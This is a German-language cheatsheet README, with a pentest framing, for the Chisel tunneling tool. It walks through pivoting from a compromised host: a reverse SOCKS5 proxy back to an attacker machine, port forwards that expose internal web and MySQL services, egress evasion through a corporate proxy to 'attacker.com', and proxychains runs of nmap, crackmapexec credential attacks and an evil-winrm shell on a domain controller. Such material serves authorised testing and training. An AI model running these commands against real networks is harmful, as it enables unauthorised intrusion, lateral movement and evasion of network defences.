<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Meißel – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```
<p align="center">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</p>

<p align="center">
  <b>⚡ Schneller TCP/UDP-Tunnel, der über HTTP transportiert, über SSH gesichert und als einzelne tragbare Binärdatei verpackt ist</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-Einführung)
- [Wie es funktioniert](#-how-it-works)
- [Installation](#-Installation)
- [Architektur- und Tunnelmodi](#-architecture--tunnel-modes)
- [Standard-Pentest-Setup: Reverse SOCKS5 Proxy](#-standard-pentest-setup-reverse-socks5-proxy)
  - [Schritt 1: Server beim Angreifer starten](#step-1-start-server-on-attacker)
  - [Schritt 2: Client vom Ziel verbinden](#step-2-connect-client-from-target)
  - [Schritt 3: Proxychains konfigurieren](#step-3-configure-proxychains)
  - [Schritt 4: Tools über den Tunnel ausführen](#step-4-execute-tools-over-the-tunnel)
- [Lokale Portweiterleitung](#-local-port-forwarding)
- [Remote-Port-Weiterleitung (Eingehenden Datenverkehr abfangen)](#-remote-port-forwarding-catcher-inbound-traffic)
- [Authentifizierung und Fingerabdruck-Pinning](#-authentication--fingerprint-pinning)
- [Egress-Umgehung und HTTP-Proxy-Verkettung](#-egress-evasion--http-proxy-chaining)
- [Chisel vs. Ligolo-ng vs. SSH](#-chisel-vs-ligolo-ng-vs-ssh)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Tipps und Best Practices](#-tips--best-practices)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
- [Ressourcen](#-Ressourcen)

---

## 🎯 Einführung

**Chisel** ist ein in Go geschriebenes, plattformübergreifendes Open-Source-Tunneling-Tool, das sichere SSH-Sitzungen in Standard-HTTP/WebSocket-Verbindungen kapselt.

Da der Datenverkehr auf dem Kabel wie normale HTTP/HTTPS- oder WebSocket-Kommunikation aussieht, navigiert Chisel problemlos durch restriktive Firewalls, Deep Packet Inspection (DPI)-Systeme und Unternehmens-Web-Proxys, die normalerweise rohen SSH- oder VPN-Datenverkehr blockieren würden.

### Schlüsselstärken

- 🚀 **Einzelne Binärdatei:** Enthält sowohl Server als auch Client in einer eigenständigen statisch kompilierten Binärdatei.
- 🛡️ **Firewall-Umgehung:** Tunnelt über den Standard-Port 80/443 oder WebSockets, um sich in den regulären Webverkehr einzumischen.
- 🔒 **Standardmäßig verschlüsselt:** Verwendet SSH-Verschlüsselung unter der Haube (ECDSA-Schlüssel und AES-GCM).
- 🔄 **SOCKS5- und Portweiterleitung:** Erstellt mühelos Reverse-SOCKS5-Proxys oder bestimmte lokal/remote weitergeleitete Ports.

---

## 🏗️ Wie es funktioniert
```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```
---

## 📥 Installation

### Kali Linux
```bash
sudo apt update && sudo apt install -y chisel
```
### Von der Quelle (Los)
```bash
go install github.com/jpillora/chisel@latest
```
### Vorkompilierte Binärdateien herunterladen

Laden Sie eigenständige Binärdateien für Linux, Windows und macOS aus den offiziellen Versionen herunter:
```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```
---

## 🔄 Standard-Pentest-Setup: Reverse SOCKS5 Proxy

Bei Standard-Penetrationstests und CTFs befindet sich der Zielcomputer hinter NAT/Firewalls und kann keine direkten eingehenden Verbindungen von Ihnen akzeptieren. Sie müssen einen **Reverse-SOCKS5-Proxy** erstellen.

### Schritt 1: Server auf Angreifer starten

Starten Sie den Chisel-Server, der auf Port `8000` (oder `443` zur Umgehung) lauscht, wobei die umgekehrte Portweiterleitung zulässig ist:
```bash
chisel server --reverse -p 8000 -v
```
### Schritt 2: Client vom Ziel verbinden

Führen Sie den Client auf dem kompromittierten Computer aus, stellen Sie eine Verbindung zu Ihrer Angreifer-IP her und öffnen Sie einen Reverse-SOCKS5-Proxy:

#### Linux-Ziel:
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```
#### Windows-Ziel:
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```
> **Ergebnis:** Der Chisel-Server auf Ihrem Angreifer-Rechner öffnet Port `1080` lokal als SOCKS5-Proxy, der über das Ziel geroutet wird!

### Schritt 3: Proxychains konfigurieren

Bearbeiten Sie `/etc/proxychains4.conf` (oder `/etc/proxychains.conf`) auf Ihrem Angreifercomputer:
```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```
### Schritt 4: Tools über den Tunnel ausführen

Stellen Sie jedem Tool `proxychains` voran, um es über den internen kompromittierten Host weiterzuleiten:
```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```
---

## 🔀 Lokale Portweiterleitung

Leiten Sie einen bestimmten internen Port hinter dem Ziel direkt an Ihren lokalen Angreifercomputer weiter, ohne dass ein vollständiger SOCKS-Proxy erforderlich ist.

### Beispiel: Zugriff auf den internen Webdienst (Port 80)

Server auf Angreifer (`192.168.1.100:8000`):
```bash
chisel server --reverse -p 8000
```
Kunde im Ziel:
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```
Navigieren Sie nun auf Ihrem Angreifercomputer zu `http://127.0.0.1:8080`, um den internen Webserver anzuzeigen!

### Beispiel: Interne Datenbank verfügbar machen (MySQL 3306)

Kunde im Ziel:
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```
Verbinden Sie sich direkt von Ihrem Angreifer-Terminal aus:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```
---

## 🌐 Remote-Port-Weiterleitung (Eingehenden Datenverkehr abfangen)

Machen Sie einen Port auf dem Zielcomputer verfügbar, der zu einem Dienst auf Ihrer Angreifer-Box zurückleitet (nützlich zum Bereitstellen von Nutzlasten oder zum Abfangen von Rückrufen).
```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```
---

## 🔐 Authentifizierung und Fingerabdruck-Pinning

In Live-Umgebungen können offene Chisel-Ports von Unbefugten gekapert werden. Schützen Sie Ihren Tunnel mit Authentifizierung:

### Authentifizierung (`--auth`)
```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```
### Fingerabdruck-Pinning (`--fingerprint`)

Wenn der Server startet, druckt er seinen Fingerabdruck des öffentlichen SSH-Schlüssels aus:
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```
Überprüfen Sie es auf dem Client, um ein MITM-Abfangen zu verhindern:
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```
---

## 🛡️ Egress-Umgehung und HTTP-Proxy-Verkettung

Wenn das interne Ziel nur über einen authentifizierenden Unternehmens-Proxy auf das Internet zugreifen kann:
```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```
---

## ⚖️ Chisel vs. Ligolo-ng vs. SSH

| Funktion | Meißel | Ligolo-ng | SSH-Tunneling |
|---------|--------|-----------|---------------|
| **Primäre Methode** | SOCKS5 & Portweiterleitung | TUN-Schnittstelle (VPN) | SOCKS5 & Portweiterleitung |
| **Transportprotokoll** | HTTP / WebSocket | Rohes TLS | SSH (Port 22) |
| **Firewall-Umgehung** | ⭐⭐⭐⭐⭐ Außergewöhnlich | ⭐⭐⭐⭐ Sehr gut | ⭐⭐ Schlecht (Port 22 normalerweise blockiert) |
| **Erfordert Root/Administrator**| ❌ Nein (nur Userland) | ✅ Ja (Um ein TUN-Gerät zu erstellen) | ❌ Nein |
| **Nmap SYN-Scan (`-sS`)**| ❌ Nein | ✅ Ja | ❌ Nein |
| **UDP-Unterstützung** | Teilweise (über SOCKS5) | ✅ Vollständiges natives UDP | ❌ Sehr begrenzt |

---

## 📊 Kurzreferenztabelle

| Modus | Befehl | Zweck |
|------|---------|---------|
| **Server (Reverse)** | `chisel server --reverse -p 8000` | Starten Sie die Reverse-Server-Abhörung auf 8000 |
| **Client (Reverse SOCKS5)** | `chisel client <IP>:8000 R:1080:socks` | Erstellen Sie Reverse SOCKS5 auf dem Port 1080 des Angreifers |
| **Client (Weiterleitungsport)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Ordnen Sie den Port 80 des Ziels dem 8080 | des Angreifers zu
| **Client (Angreifer-Port offenlegen)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | Öffnen Sie Port 4444 auf dem Ziel-Routing zum Angreifer |
| **Auth-Server** | `chisel server --reverse --auth "u:p" -p 8000` | Anmeldeinformationen von verbindenden Clients verlangen |
| **Auth-Client** | `chisel client --auth "u:p" <IP>:8000 R:socks` | Mit Anmeldeinformationen verbinden |
| **Keep-Alive-Tuning** | `chisel client --keepalive 10s <IP>:8000 R:socks`| Verhindern Sie Ausfälle von Firewall-Leerlaufsitzungen |

---

## 💡 Tipps und Best Practices

1. **Verwenden Sie Port 443 für maximale Umgehung:**
   Firewalls prüfen häufig den Datenverkehr auf beliebigen Ports wie 8000 oder 8080. Durch den Betrieb Ihres Chisel-Servers auf Port `443` wird sichergestellt, dass der Datenverkehr identisch mit HTTPS-WebSockets aussieht.
2. **Timeout für Proxy-Ketten optimieren:**
   Wenn sich Proxychain-Verbindungen träge anfühlen, bearbeiten Sie `/etc/proxychains4.conf` und legen Sie Folgendes fest:
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **Auf dem Ziel sind keine Root-Rechte erforderlich:**
   Im Gegensatz zu VPN- oder TUN-Lösungen läuft Chisel ausschließlich im Benutzerbereich. Sie können `chisel.exe` oder `chisel` als Dienstkonten mit geringen Berechtigungen ausführen (`www-data`, `nobody`, Standard-Windows-Benutzer).

---

## ⚠️ Rechtlicher Haftungsausschluss

> **WICHTIG:** Chisel ist für autorisierte Netzwerktests, Red-Team-Simulationen und Systemadministration gedacht. Der Einsatz von Tunneling-Tools in nicht autorisierten Netzwerken verstößt gegen Computersicherheitsgesetze.

---

## 📚 Ressourcen

- [Chisel GitHub Repository](https://github.com/jpillora/chisel)
- [Proxychains-NG-Projekt](https://github.com/rofl0r/proxychains-ng)